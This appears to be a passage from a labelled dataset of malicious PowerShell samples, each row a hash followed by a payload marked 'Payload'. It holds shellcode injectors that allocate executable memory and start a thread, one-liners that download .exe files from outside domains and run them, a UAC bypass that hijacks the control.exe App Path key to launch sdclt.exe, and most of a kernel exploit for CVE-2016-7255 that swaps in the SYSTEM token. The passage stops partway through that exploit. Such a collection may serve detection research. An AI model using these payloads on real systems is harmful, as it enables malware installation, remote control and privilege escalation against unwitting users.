9,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x01,0x0a,0x59,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b0c4041a617c4347ad79749b0da823e642f07d36eeee57e98d467a3950cb10e1,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nazy.exe', $dpl);Start-Process $dpl

",Payload
25b815735c2e901ccb6cf4c5a0f7dc2ee97e57b2979593e6b7967b006211ea55,"
(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/updates/eter.exe',""$env:TEMP\\config.exe"");Start-Process (""$env:TEMP\\config.exe"")

",Payload
d5ac021fb7ece670d6029f9bfaa8bd0e349ed1e2cce9c07ac8255761ed797bc8,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcc,0xd9,0x74,0x24,0xf4,0xbb,0x47,0xfe,0xc4,0x44,0x5f,0x31,0xc9,0xb1,0x47,0x83,0xc7,0x04,0x31,0x5f,0x14,0x03,0x5f,0x53,0x1c,0x31,0xb8,0xb3,0x62,0xba,0x41,0x43,0x03,0x32,0xa4,0x72,0x03,0x20,0xac,0x24,0xb3,0x22,0xe0,0xc8,0x38,0x66,0x11,0x5b,0x4c,0xaf,0x16,0xec,0xfb,0x89,0x19,0xed,0x50,0xe9,0x38,0x6d,0xab,0x3e,0x9b,0x4c,0x64,0x33,0xda,0x89,0x99,0xbe,0x8e,0x42,0xd5,0x6d,0x3f,0xe7,0xa3,0xad,0xb4,0xbb,0x22,0xb6,0x29,0x0b,0x44,0x97,0xff,0x00,0x1f,0x37,0x01,0xc5,0x2b,0x7e,0x19,0x0a,0x11,0xc8,0x92,0xf8,0xed,0xcb,0x72,0x31,0x0d,0x67,0xbb,0xfe,0xfc,0x79,0xfb,0x38,0x1f,0x0c,0xf5,0x3b,0xa2,0x17,0xc2,0x46,0x78,0x9d,0xd1,0xe0,0x0b,0x05,0x3e,0x11,0xdf,0xd0,0xb5,0x1d,0x94,0x97,0x92,0x01,0x2b,0x7b,0xa9,0x3d,0xa0,0x7a,0x7e,0xb4,0xf2,0x58,0x5a,0x9d,0xa1,0xc1,0xfb,0x7b,0x07,0xfd,0x1c,0x24,0xf8,0x5b,0x56,0xc8,0xed,0xd1,0x35,0x84,0xc2,0xdb,0xc5,0x54,0x4d,0x6b,0xb5,0x66,0xd2,0xc7,0x51,0xca,0x9b,0xc1,0xa6,0x2d,0xb6,0xb6,0x39,0xd0,0x39,0xc7,0x10,0x16,0x6d,0x97,0x0a,0xbf,0x0e,0x7c,0xcb,0x40,0xdb,0xd3,0x9b,0xee,0xb4,0x93,0x4b,0x4e,0x65,0x7c,0x86,0x41,0x5a,0x9c,0xa9,0x88,0xf3,0x37,0x53,0x5a,0x35,0x37,0xaf,0x67,0xad,0xba,0x50,0x86,0x72,0x32,0xb6,0xc2,0x9a,0x12,0x60,0x7a,0x02,0x3f,0xfa,0x1b,0xcb,0x95,0x86,0x1b,0x47,0x1a,0x76,0xd5,0xa0,0x57,0x64,0x81,0x40,0x22,0xd6,0x07,0x5e,0x98,0x7d,0xa7,0xca,0x27,0xd4,0xf0,0x62,0x2a,0x01,0x36,0x2d,0xd5,0x64,0x4d,0xe4,0x43,0xc7,0x39,0x09,0x84,0xc7,0xb9,0x5f,0xce,0xc7,0xd1,0x07,0xaa,0x9b,0xc4,0x47,0x67,0x88,0x55,0xd2,0x88,0xf9,0x0a,0x75,0xe1,0x07,0x75,0xb1,0xae,0xf8,0x50,0x43,0x92,0x2e,0x9c,0x31,0xfa,0xf2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
82fc7ada3783413a10d7bc1f5dc957a78b8dfbcc84daee8e4db84d01afd2554d,"function Invoke-AppPathBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Payload,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        ""UAC is set to 'Always Notify'. This module does not bypass this setting.""
        exit
    }
    else{
        
        $AppPath = ""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe""
        if ($Force -or ((Get-ItemProperty -Path $AppPath -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $AppPath -Force |
                New-ItemProperty -Name '(default)' -Value $Payload -PropertyType string -Force | Out-Null
        }else{
            Write-Warning ""Key already exists, consider using -Force""
            exit
        }

        if (Test-Path $AppPath) {
            Write-Verbose ""Created registry entries for control.exe App Path""
        }else{
            Write-Warning ""Failed to create registry key, exiting""
            exit
        }

        $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
            $Process = Start-Process -FilePath $sdcltPath  -PassThru
            Write-Verbose ""Started sdclt.exe""
        }

        
        Write-Verbose ""Sleeping 5 seconds to trigger payload""
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        if (Test-Path $AppPath) {
            
            Remove-Item $AppPath -Recurse -Force
            Write-Verbose ""Removed registry entries""
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose ""Killed running sdclt process""
        }
    }
}
",Payload
d0dcadccd320d4937e7a64818b627e4bb49f6e6c7d86330bded5e4b5f0380bf1,"Add-Type -TypeDefinition @""
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

[StructLayout(LayoutKind.Sequential)]
public struct INPUT
{
	public int itype;
	public KEYBDINPUT U;
	public int Size;
}

[StructLayout(LayoutKind.Sequential)]
public struct KEYBDINPUT
{
	public UInt16 wVk;
	public UInt16 wScan;
	public uint dwFlags;
	public int time;
	public IntPtr dwExtraInfo;
}

[StructLayout(LayoutKind.Sequential)] 
public struct tagMSG  
{  
    public IntPtr hwnd;
    public UInt32 message;
    public UIntPtr wParam;
    public UIntPtr lParam;
    public UInt32 time;
    public POINT pt;
}

public struct POINT
{  
    public Int32 x;
    public Int32 Y;
}

public class ms16135
{
	delegate IntPtr WndProc(
		IntPtr hWnd,
		uint msg,
		IntPtr wParam,
		IntPtr lParam);

	[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
	struct WNDCLASSEX
	{
		public uint cbSize;
		public uint style;
		public IntPtr lpfnWndProc;
		public int cbClsExtra;
		public int cbWndExtra;
		public IntPtr hInstance;
		public IntPtr hIcon;
		public IntPtr hCursor;
		public IntPtr hbrBackground;
		[MarshalAs(UnmanagedType.LPWStr)]
		public string lpszMenuName;
		[MarshalAs(UnmanagedType.LPWStr)]
		public string lpszClassName;
		public IntPtr hIconSm;
	}
	
	[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
	static extern System.UInt16 RegisterClassW(
		[System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass);

	[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
	public static extern IntPtr CreateWindowExW(
		UInt32 dwExStyle,
		[MarshalAs(UnmanagedType.LPWStr)]
		string lpClassName,
		[MarshalAs(UnmanagedType.LPWStr)]
		string lpWindowName,
		UInt32 dwStyle,
		Int32 x,
		Int32 y,
		Int32 nWidth,
		Int32 nHeight,
		IntPtr hWndParent,
		IntPtr hMenu,
		IntPtr hInstance,
		IntPtr lpParam);

	[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
	static extern System.IntPtr DefWindowProcW(
		IntPtr hWnd,
		uint msg,
		IntPtr wParam,
		IntPtr lParam);

	[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
	public static extern bool DestroyWindow(
		IntPtr hWnd);

	[DllImport(""user32.dll"", SetLastError = true)]
	public static extern bool UnregisterClass(
		String lpClassName,
		IntPtr hInstance);

	[System.Runtime.InteropServices.DllImport(""kernel32.dll"", SetLastError = true)]
	public static extern IntPtr GetModuleHandleW(
		[MarshalAs(UnmanagedType.LPWStr)]
		String lpModuleName);

	[DllImport(""user32.dll"", EntryPoint=""SetWindowLongPtr"")]
	public static extern IntPtr SetWindowLongPtr(
		IntPtr hWnd,
		int nIndex,
		IntPtr dwNewLong);

	[DllImport(""user32.dll"")]
	public static extern bool ShowWindow(
		IntPtr hWnd,
		int nCmdShow);

	[DllImport(""user32.dll"", SetLastError = true)]
	public static extern IntPtr SetParent(
		IntPtr hWndChild,
		IntPtr hWndNewParent);

	[DllImport(""user32.dll"", SetLastError = false)]
	public static extern IntPtr GetDesktopWindow();

	[DllImport(""user32.dll"")]
	public static extern bool SetForegroundWindow(
		IntPtr hWnd);

	[DllImport(""user32.dll"", SetLastError=true)]
	public static extern void SwitchToThisWindow(
		IntPtr hWnd,
		bool fAltTab);

	[DllImport(""user32.dll"")]
	public static extern bool GetMessage(
		out tagMSG lpMsg,
		IntPtr hWnd,
		uint wMsgFilterMin,
		uint wMsgFilterMax);

	[DllImport(""user32.dll"")]
	public static extern bool TranslateMessage(
		[In] ref tagMSG lpMsg);

	[DllImport(""user32.dll"")]
	public static extern IntPtr DispatchMessage(
		[In] ref tagMSG lpmsg);

	[DllImport(""user32.dll"", SetLastError = true)]
	public static extern IntPtr SetFocus(
		IntPtr hWnd);

	[DllImport(""user32.dll"")]
	public static extern uint SendInput(
		uint nInputs, 
		[In] INPUT pInputs, 
		int cbSize);

	[DllImport(""gdi32.dll"")]
	public static extern int GetBitmapBits(
		IntPtr hbmp,
		int cbBuffer,
		IntPtr lpvBits);

	[DllImport(""gdi32.dll"")]
	public static extern int SetBitmapBits(
		IntPtr hbmp,
		int cbBytes,
		IntPtr lpBits);

	[DllImport(""kernel32.dll"", SetLastError = true)]
	public static extern IntPtr VirtualAlloc(
		IntPtr lpAddress,
		uint dwSize,
		UInt32 flAllocationType,
		UInt32 flProtect);

	public UInt16 CustomClass(string class_name)
	{
		m_wnd_proc_delegate = CustomWndProc;
		WNDCLASSEX wind_class = new WNDCLASSEX();
		wind_class.lpszClassName = class_name;
		///wind_class.cbSize = (uint)Marshal.SizeOf(wind_class);
		wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
		return RegisterClassW(ref wind_class);
	}

	private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
	{
		return DefWindowProcW(hWnd, msg, wParam, lParam);
	}

	private WndProc m_wnd_proc_delegate;
}
""@


	$ms16135 = @""
	 _____ _____ ___   ___     ___   ___ ___ 
	|     |   __|_  | |  _|___|_  | |_  |  _|
	| | | |__   |_| |_| . |___|_| |_|_  |_  |
	|_|_|_|_____|_____|___|   |_____|___|___|
										
	                   [by b33f -> @FuzzySec]
					   
""@
$ms16135



if ([System.IntPtr]::Size -ne 8) {
	echo ""`n[!] Target architecture is x64 only!`n""
	Return
}


$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$Script:OSMajorMinor = ""$($OSVersion.Major).$($OSVersion.Minor)""
switch ($OSMajorMinor)
{
	'10.0' 
	{
		echo ""[?] Target is Win 10""
		echo ""[+] Bitmap dimensions: 0x760*0x4`n""
	}

	'6.3' 
	{
		echo ""[?] Target is Win 8.1""
		echo ""[+] Bitmap dimensions: 0x760*0x4`n""
	}

	'6.2' 
	{
		echo ""[?] Target is Win 8""
		echo ""[+] Bitmap dimensions: 0x760*0x4`n""
	}

	'6.1' 
	{
		echo ""[?] Target is Win 7""
		echo ""[+] Bitmap dimensions: 0x770*0x4`n""
	}
}


function Get-LoadedModules {


	Add-Type -TypeDefinition @""
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct SYSTEM_MODULE_INFORMATION
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		public UIntPtr[] Reserved;
		public IntPtr ImageBase;
		public UInt32 ImageSize;
		public UInt32 Flags;
		public UInt16 LoadOrderIndex;
		public UInt16 InitOrderIndex;
		public UInt16 LoadCount;
		public UInt16 ModuleNameOffset;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		internal Char[] _ImageName;
		public String ImageName {
			get {
				return new String(_ImageName).Split(new Char[] {'\\0'}, 2)[0];
			}
		}
	}

	public static class Ntdll
	{
		[DllImport(""ntdll.dll"")]
		public static extern int NtQuerySystemInformation(
			int SystemInformationClass,
			IntPtr SystemInformation,
			int SystemInformationLength,
			ref int ReturnLength);
	}
""@

	[int]$BuffPtr_Size = 0
	while ($true) {
		[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
		$SystemInformationLength = New-Object Int
	
		
		$CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
		
		
		if ($CallResult -eq 0xC0000004) {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
		}
		
		elseif ($CallResult -eq 0x00000000) {
			break
		}
		
		else {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			return
		}
	}

	$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
	$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
	if ([System.IntPtr]::Size -eq 4) {
		$SYSTEM_MODULE_INFORMATION_Size = 284
	} else {
		$SYSTEM_MODULE_INFORMATION_Size = 296
	}

	$BuffOffset = $BuffPtr.ToInt64()
	$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
	$BuffOffset = $BuffOffset + [System.IntPtr]::Size

	$SystemModuleArray = @()
	for ($i=0; $i -lt $HandleCount; $i++){
		$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
		$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
		
		$HashTable = @{
			ImageName = $Cast.ImageName
			ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
			ImageSize = ""0x$('{0:X}' -f $Cast.ImageSize)""
		}
		
		$Object = New-Object PSObject -Property $HashTable
		$SystemModuleArray += $Object
	
		$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
	}

	$SystemModuleArray

	
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
}

function Stage-gSharedInfoBitmap {


	Add-Type -TypeDefinition @""
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	public static class gSharedInfoBitmap
	{
		[DllImport(""gdi32.dll"")]
		public static extern IntPtr CreateBitmap(
		    int nWidth,
		    int nHeight,
		    uint cPlanes,
		    uint cBitsPerPel,
		    IntPtr lpvBits);

		[DllImport(""kernel32"", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
		    string lpFileName);
		
		[DllImport(""kernel32"", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
		    IntPtr hModule,
		    string procName);

		[DllImport(""user32.dll"")]
		public static extern IntPtr CreateAcceleratorTable(
		    IntPtr lpaccl,
		    int cEntries);

		[DllImport(""user32.dll"")]
		public static extern bool DestroyAcceleratorTable(
		    IntPtr hAccel);
	}
""@

	
	if ([System.IntPtr]::Size -eq 4) {
		$x32 = 1
	}

	function Create-AcceleratorTable {
	    [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
	    $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) 
	    $User32Hanle = [gSharedInfoBitmap]::LoadLibrary(""user32.dll"")
	    $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, ""gSharedInfo"")
	    if ($x32){
	        $gSharedInfo = $gSharedInfo.ToInt32()
	    } else {
	        $gSharedInfo = $gSharedInfo.ToInt64()
	    }
	    $aheList = $gSharedInfo + [System.IntPtr]::Size
	    if ($x32){
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc 
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
	    } else {
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
	    }

	    $Result = @()
	    $HashTable = @{
	        Handle = $AccelHandle
	        KernelObj = $phead
	    }
	    $Object = New-Object PSObject -Property $HashTable
	    $Result += $Object
	    $Result
	}

	function Destroy-AcceleratorTable {
	    param ($Hanlde)
	    $CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
	}

	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
	    $KernelArray += Create-AcceleratorTable
	    if ($KernelArray.Length -gt 1) {
	        if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
	            Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	            [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
				if ($OSMajorMinor -eq ""6.1"") { 
					$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, $Buffer) 
				} else {
					$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, $Buffer) 
				}
	            break
	        }
	    }
	    Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	}

	$BitMapObject = @()
	$HashTable = @{
	    BitmapHandle = $BitmapHandle
	    BitmapKernelObj = $($KernelArray[$i].KernelObj)
	    BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}

function Bitmap-Elevate {
	param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap)

	Add-Type -TypeDefinition @""
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class BitmapElevate
	{
		[DllImport(""gdi32.dll"")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport(""gdi32.dll"")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		[DllImport(""kernel32.dll"", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport(""kernel32"", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport(""kernel32"", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	}
""@

	
	function Bitmap-Read {
		param ($Address)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		}
		$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}
	
	
	function Bitmap-Write {
		param ($Address, $Value)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
	}

	switch ($OSMajorMinor)
	{
		'10.0' 
		{
			$UniqueProcessIdOffset = 0x2e8
			$TokenOffset = 0x358          
			$ActiveProcessLinks = 0x2f0
		}
	
		'6.3' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.2' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.1' 
		{
			$UniqueProcessIdOffset = 0x180
			$TokenOffset = 0x208          
			$ActiveProcessLinks = 0x188
		}
	}
	
	
	echo ""`n[>] Leaking SYSTEM _EPROCESS..""
	$SystemModuleArray = Get-LoadedModules
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split ""\\\\"")[-1]
	$KernelHanle = [BitmapElevate]::LoadLibrary(""$KernelType"")
	$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, ""PsInitialSystemProcess"")
	$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
	$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
	echo ""[+] _EPROCESS list entry: 0x$(""{0:X}"" -f $SysEprocessPtr)""
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	echo ""[+] SYSTEM _EPROCESS address: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $SysEprocessPtr))""
	echo ""[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))""
	echo ""[+] SYSTEM Token: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))""
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	
	
	echo ""`n[>] Leaking current _EPROCESS..""
	echo ""[+] Traversing ActiveProcessLinks list""
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $PID) {
			echo ""[+] PowerShell _EPROCESS address: 0x$(""{0:X}"" -f $NextProcess)""
			echo ""[+] PID: $NextPID""
			echo ""[+] PowerShell Token: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))""
			$PoShTokenAddr = $NextProcess+$TokenOffset
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}
	
	
	echo ""`n[!] Duplicating SYSTEM token!`n""
	Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
}



function Sim-KeyDown {
	param([Int]$wKey)
	$KeyboardInput = New-Object KEYBDINPUT
	$KeyboardInput.dwFlags = 0
	$KeyboardInput.wVk = $wKey

	$InputObject = New-Object INPUT
	$InputObject.itype = 1
	$InputObject.U = $KeyboardInput
	$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
	
	$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
	if ($CallResult -eq 1) {
		$true
	} else {
		$false
	}
}

function Sim-KeyUp {
	param([Int]$wKey)
	$KeyboardInput = New-Object KEYBDINPUT
	$KeyboardInput.dwFlags = 2
	$KeyboardInput.wVk = $wKey
	
	$InputObject = New-Object INPUT
	$InputObject.itype = 1
	$InputObject.U = $KeyboardInput
	$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
	
	$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
	if ($CallResult -eq 1) {
		$true
	} else {
		$false
	}
}

function Do-AltShiftEsc {
	$CallResult = Sim-KeyDown -wKey 0x12 
	$CallResult = Sim-KeyDown -wKey 0x10 
	$CallResult = Sim-KeyDown -wKey 0x1b 
	$CallResult = Sim-KeyUp -wKey 0x1b   
	$CallResult = Sim-KeyDown -wKey 0x1b 
	$CallResult = Sim-KeyUp -wKey 0x1b   
	$CallResult = Sim-KeyUp -wKey 0x12   
	$CallResult = Sim-KeyUp -wKey 0x10   
}

function Do-AltShiftTab {
	param([Int]$Count)
	$CallResult = Sim-KeyDown -wKey 0x12    
	$CallResult = Sim-KeyDown -wKey 0x10    
	for ($i=0;$i -lt $count;$i++) {
		$CallResult = Sim-KeyDown -wKey 0x9 
		$CallResult = Sim-KeyUp -wKey 0x9   
	}
	$CallResult = Sim-KeyUp -wKey 0x12      
	$CallResult = Sim-KeyUp -wKey 0x10      
}


do {
	$Bitmap1 = Stage-gSharedInfoBitmap
	$Bitmap2 = Stage-gSharedInfoBitmap
	if ($Bitmap1.BitmapKernelObj -lt $Bitmap2.BitmapKernelObj) {
		$WorkerBitmap = $Bitmap1
		$ManagerBitmap = $Bitmap2
	} else {
		$WorkerBitmap = $Bitmap2
		$ManagerBitmap = $Bitmap1
	}
	$Distance = $ManagerBitmap.BitmapKernelObj - $WorkerBitmap.BitmapKernelObj
} while ($Distance -ne 0x2000)

echo ""[?] Adjacent large session pool feng shui..""
echo ""[+] Worker  : $('{0:X}' -f $WorkerBitmap.BitmapKernelObj)""
echo ""[+] Manager : $('{0:X}' -f $ManagerBitmap.BitmapKernelObj)""
echo ""[+] Distance: 0x$('{0:X}' -f $Distance)""


$TargetAddress = $WorkerBitmap.BitmapKernelObj + 63


function Do-OrAddress {
	param([Int64]$Address)

	
	$AtomCreate = New-Object ms16135
	$hAtom = $AtomCreate.CustomClass(""cve-2016-7255"")
	if ($hAtom -eq 0){
		break
	}

	echo ""`n[?] Creating Window objects""
	$hMod = [ms16135]::GetModuleHandleW([String]::Empty)
	
	$hWndParent = [ms16135]::CreateWindowExW(0,""cve-2016-7255"",[String]::Empty,0x10CF0000,0,0,360,360,[IntPtr]::Zero,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
	if ($hWndParent -eq 0){
		break
	}

	
	$hWndChild = [ms16135]::CreateWindowExW(0,""cve-2016-7255"",""cve-2016-7255"",0x50CF0000,0,0,160,160,$hWndParent,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
	if ($hWndChild -eq 0){
		break
	}

	
	$Address = $Address - 0x28

	echo ""[+] Corrupting child window spmenu""
	
	$CallResult = [ms16135]::SetWindowLongPtr($hWndChild,-12,[IntPtr]$Address)

	
	$CallResult = [ms16135]::ShowWindow($hWndParent,1)
	$hDesktopWindow = [ms16135]::GetDesktopWindow()
	$CallResult = [ms16135]::SetParent($hWndChild,$hDesktopWindow)
	$CallResult = [ms16135]::SetForegroundWindow($hWndChild)

	Do-AltShiftTab -Count 4

